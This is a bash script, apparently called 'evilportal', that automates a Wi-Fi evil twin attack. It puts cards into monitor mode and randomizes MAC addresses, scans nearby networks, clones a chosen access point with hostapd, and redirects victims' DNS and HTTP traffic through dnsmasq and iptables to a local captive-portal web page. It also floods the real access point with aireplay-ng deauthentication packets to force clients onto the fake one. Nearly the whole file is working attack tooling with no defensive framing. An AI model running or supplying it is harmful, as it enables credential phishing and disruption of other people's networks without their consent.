#!/bin/bash

tempFolder="/tmp/evilportal"

titulo () {
	echo "
███████╗██╗   ██╗██╗██╗
██╔════╝██║   ██║██║██║
█████╗  ██║   ██║██║██║
██╔══╝  ╚██╗ ██╔╝██║██║
███████╗ ╚████╔╝ ██║███████╗
╚══════╝  ╚═══╝  ╚═╝╚══════╝
██████╗  ██████╗ ██████╗ ████████╗ █████╗ ██╗
██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██║
██████╔╝██║   ██║██████╔╝   ██║   ███████║██║
██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══██║██║
██║     ╚██████╔╝██║  ██║   ██║   ██║  ██║███████╗
╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝

"
}

selectNetworkInterface () {
	nInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]' | wc -l)
	nMonInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | wc -l)

	if [ $nInterfaces -eq 1 ]
	then
		echo "[-] Configuring network interface..."
		if [ $nMonInterfaces -eq 0 ]
		then
                        tempInterface=$(airmon-ng | grep -oiE 'wlan[0-9]')
                        tempStatus=$(airmon-ng start $tempInterface | grep -o enabled)
                        if [ "$tempStatus" != "enabled" ]
                        then
			        echo "[x] Network interface couldn't be put in monitor mode"
                               	ok=0
                        else
				interface="$tempInterface"mon
	                        ok=1
			fi
		else
			interface=$(airmon-ng | grep -oiE 'wlan[0-9]mon')
                        ok=1
		fi
	elif [ $nInterfaces -gt 1 ]
	then
		echo
		echo "Network interfaces:"
		echo
		line=4
		i=1

		interface[$i]=$(airmon-ng | sed -n "$line"p | cut -d "	" -f 2)
                printf '%-4s %-4s %-10s\n' "[$i]" " -> " "${interface[$i]}"
		while [ ${interface[$i]} ]
		do
			line=$(( $line + 1 ))
                       	i=$(( $i + 1 ))

			interface[$i]=$(airmon-ng | sed -n "$line"p | cut -d "	" -f 2)
			printf '%-4s %-4s %-10s\n' "[$i]" " -> " "${interface[$i]}"
			line=$(( $line + 1 ))
			i=$(( $i + 1 ))
		done
		echo
		echo -n "Select a network interface > "
		read op
		echo
		echo "[-] Configuring network interface..."

		tempInterface=${interface[$op]}
		substring=$(echo $tempInterface | grep "mon")
		if [ $substring ]
		then
			interface="$tempInterface"
	                ok=1
		else
			tempStatus=$(airmon-ng start $tempInterface | grep -o enabled)
			if [ "$tempStatus" != "enabled" ]
			then
				echo "[x] Selected network interface couldn't be put in monitor mode"
				ok=0
			else
				interface="$tempInterface"mon
		                ok=1
			fi
		fi
	else
		echo "[x] No network interface found"
		echo
		ok=0
	fi

	if [ $ok -eq 1 ]
	then
		echo "[-] Upgrading network interface..."
                ifconfig $interface down
                iw reg set US
                echo "[+] Network interface upgraded"

                echo "[-] Changing MAC address..."
                macchanger -r $interface >/dev/null
                ifconfig $interface up
                echo "[+] MAC address changed"

		echo "[+] Network interface succesfully configured"
		echo
	fi
}

selectNetworkInterface2 () {
	echo "[-] Configuring network interface..."
        nInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]' | wc -l)
        nMonInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | wc -l)

        if [ $nInterfaces -eq 2 ]
        then
                if [ $nMonInterfaces -eq 1 ]
                then
                        tempInterface=$(airmon-ng | grep -oiwE 'wlan[0-9]')
                        tempStatus=$(airmon-ng start $tempInterface | grep -o enabled)
                        if [ "$tempStatus" != "enabled" ]
                        then
                                echo "[x] Network interface couldn't be put in monitor mode"
                                ok=0
                        else
                                interface2="$tempInterface"mon
                                ok=1
                        fi
                else
                        interface2=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | sed -n 1p)
			if [ "$1" = "$interface2" ]
                        then
                                interface2=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | sed -n 2p)
                        fi
                        ok=1
                fi
        else
                echo "[x] Not enough network interfaces found (2)"
		echo
        	ok=0
	fi

        if [ $ok -eq 1 ]
        then
		echo "[-] Upgrading network interface..."
                ifconfig $interface down
                iw reg set US
                echo "[+] Network interface upgraded"

                echo "[-] Changing MAC address..."
                macchanger -r $interface >/dev/null
                ifconfig $interface up
                echo "[+] MAC address changed"

                echo "[+] Network interface succesfully configured"
		echo
	fi

}

selectNetwork () {
	network=0
	while [ $network -eq 0 ]
	do
		read -p "Seconds to scann for networks [default is 10]> " t

	        airodump-ng -w $tempFolder/temporal --output-format netxml $interface>/dev/null &

		if [ -z $t ]
		then
	        	t=10
		fi

		echo
		echo "[-] Scanning for networks ($t seconds)..."
		echo
	        sleep $t
	        pkill airodump-ng

	        num=$(grep "<wireless-network"  $tempFolder/temporal-01.kismet.netxml | wc -l)
	        begLines=$(grep -n "<wireless-network" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1)
	        endLines=$(grep -n "</wireless-network>" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1)

	        i=1
	        while [ $i -le $num ]
	        do
	                beg=$(echo $begLines | cut -d " " -f $i)
	                end=$(echo $endLines | cut -d " " -f $i)

	                tusers[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep "</wireless-client>" | wc -l)
	                if [ ${tusers[$i]} -ge 1 ]
	                then
	                        prov=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep -n "<wireless-client" -m 1 | cut -d ":" -f 1)
	                        end=$(( $beg + $prov ))
	                fi

	                tbssid[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep BSSID | cut -d ">" -f 2 | cut -d "<" -f 1)
	                tessid[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep essid | cut -d ">" -f 2 | cut -d "<" -f 1)
	                tchannel[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep channel -m 1 | cut -d ">" -f 2 | cut -d "<" -f 1)
	                tencr[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep encryption -m 1 | cut -d ">" -f 2 | cut -d "<" -f 1)

	                if [ -z "${tessid[$i]}" ]
	                then
	                        tessid[$i]="Unknown"
	                fi

	                if [ $(echo "${tencr[$i]}" | grep "WPA") ]
	                then
	                        tencr[$i]="WPA"
	                elif [ $(echo "${tencr[$i]}" | grep "None") ]
	                then
	                        tencr[$i]="OPEN"
	                else
	                        tencr[$i]="-----"
	                fi

	                i=$(( $i + 1 ))
	        done

	        echo "WIFI NETWORKS"
	        echo "Network interface: $interface"
		echo "+----+-------+-------+-----------------------------------+"
	        echo "| i  |ENCRYPT|CLIENTS|     ESSID                         |"
	        echo "+----+-------+-------+-----------------------------------+"
	        i=1
	        while [ $i -le $num ]
	        do
	                printf  '%-1s %-2s %-1s %-5s %-3s %-3s %-1s %-33s %-1s\n'  "|" "$i" "|" "${tencr[$i]}" "|" "${tusers[$i]}" "|" "${tessid[$i]}" "|"
	                i=$(( $i + 1 ))
	        done
		echo "+----+-------+-------+-----------------------------------+"
	        echo
	        read -p "Select a network [0 to repeat scann]> " network
	done

        bssid=${tbssid[$network]}
        essid=${tessid[$network]}
        channel=${tchannel[$network]}
        encr=${tencr[$network]}

}

deauth(){
	iwconfig "$3" channel "$2"
        sleep 3
        aireplay-ng -0 0 -a "$1" "$3" >/dev/null &
}

titulo

if [ $EUID -ne 0 ]
then
	echo "[x] Please, run script as root"
else
	selectNetworkInterface
	if [ $ok -eq 1 ]
	then

################################ PROGRAMS NEEDED ####################################

		echo "[-] Updating packages..."
		apt-get install -y hostapd apache2 dnsmasq aircrack-ng gnome-terminal >/dev/null
		rm -r $tempFolder 2>/dev/null
		mkdir $tempFolder 2>/dev/null
		echo "[+] All packages updated"

######################### IPTABLES FLUSH TO AVOID CONFLICTS ##########################

		echo "[-] Flushing iptables..."
		iptables -F
		iptables -t nat -F
		echo "[+] Iptables flushed"

################################# HOSTAPD CONFIG #####################################

		op=-1
	        while [ $op -lt 0 ] || [ $op -gt 2 ]
	        do
	                echo
			echo "Mode:"
	                echo "[1] -> Create new acces point"
	                echo "[2] -> [Evil Twin] Intercept existing access point"
	                read -p "> " op
			echo

	                if [ $op -lt 0 ] || [ $op -gt 2 ]
	                then
	                        echo "[x] Please, select a valid option: "
	                fi
	        done

	        if [ $op -eq 1 ]
	        then
	                deauth=0
	                read -p "Wifi essid > " essid
	                read -p "Channel > " channel
			echo
			op=-1
			echo "Security: "
	        	while [ $op -lt 0 ] || [ $op -gt 2 ]
	        	do
	                	echo "[1] -> Open"
		                echo "[2] -> WPA2"
	        	        read -p "> " op
				echo

	                	if [ $op -lt 1 ] || [ $op -gt 2 ]
	                	then
	                        	echo "Please, select a valid option: "
	                	fi

				if [ $op -eq 1 ]
				then
					encr="OPEN"
				else
					encr="WPA"
				fi

	        	done
		elif [ $op -eq 2 ]
	        then
	                deauth=1
			selectNetworkInterface2 $interface
	                if [ $ok -eq 1 ]
			then
				selectNetwork
	        	fi
		fi

		if [ $ok -eq 1 ]
		then

		        if [ "$encr" = "OPEN" ]
		        then

		                echo "interface=$interface
driver=nl80211
ssid=$essid
hw_mode=g
channel=$channel
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf

		        else

		        	read -p "Wifi password [more than 8 chars]> " pass
				echo

		        	echo "interface=$interface
driver=nl80211
ssid=$essid
hw_mode=g
wpa=2
wpa_passphrase=$pass
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
channel=$channel
macaddr_acl=0
auth_algs=3
ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf

		        fi

			hostapd $tempFolder/hostapd.conf -B > $tempFolder/hostapd.log

########################## DNSMASQ CONFIG (DNS & DHCP) ###############################

			# Stops dnsmasq daemon on port 53
			service dnsmasq stop

			# Checks for Internet connection
			conex=$(ping -c 3 google.com | grep -oiwE '[100-0]\%' | grep -oiwE '[100-0]')

			if [ $conex -lt 100 ]
			then

				echo "interface=$interface
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
listen-address=127.0.0.1" > $tempFolder/dnsmasq.conf

				# IPTABLES CONFIG IF THE MACHINE HAS CONNECTION

				# We redirect to 10.0.0.1:80 everything going to port 80 of this machine
				iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80

				# Everything going out this machine goes by eth0 and masqued
				iptables -t nat -A POSTROUTING --out-interface eth0 -j MASQUERADE

			else

				echo "interface=$interface
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
listen-address=127.0.0.1
address=/#/10.0.0.1" > $tempFolder/dnsmasq.conf

			fi

			# Configures dnsmasq to assign the interface ip with the domain name so mod_rewrite
			# (.htaccess) can reffer directly to the domain name in the URL
			echo "10.0.0.1 wifiportal2.aire.es" > $tempFolder/hosts

			ifconfig $interface 10.0.0.1

			dnsmasq -C $tempFolder/dnsmasq.conf -H $tempFolder/hosts

################################### WEB FILES #########################################

			rm -r /var/www/html/*
			cp -r captive /var/www/html/captive
			cp .htaccess /var/www/html
			chmod 777 /var/www/html/.htaccess
			chmod 777 /var/www/html/captive
			chmod 777 /var/www/html/captive/*

			cp -f override.conf /etc/apache2/conf-available/

			# Enables rewrite and override for .htaccess
			a2enconf override
			a2enmod rewrite

			# Removes previous wireless configuration
			rm -rf /etc/wpa_supplicant/wpa_supplicant.conf

			service apache2 reload
			service apache2 restart
			service mysql start

			if [ $deauth -eq 1 ]
		        then
				deauth $bssid $channel $interface2
			fi

			while [ true ]
			do
				echo "[1] -> See hostapd logs"
				echo "[2] -> Stop hostapd and dnsmasq"
				echo "[3] -> Stop aireplay-ng"
				read -p ">" op
				if [ $op -eq 1 ]
				then
					cat $tempFolder/hostapd.log
				elif [ $op -eq 2 ]
				then
					pkill hostapd
					pkill dnsmasq
				elif [ $op -eq 3 ]
				then
					pkill aireplay-ng
				elif [ $op -le 0 ] || [ $op -ge 4 ]
				then
					echo "[x]Please, select a valid option"
				fi
			done
		fi
	fi
fi
echo
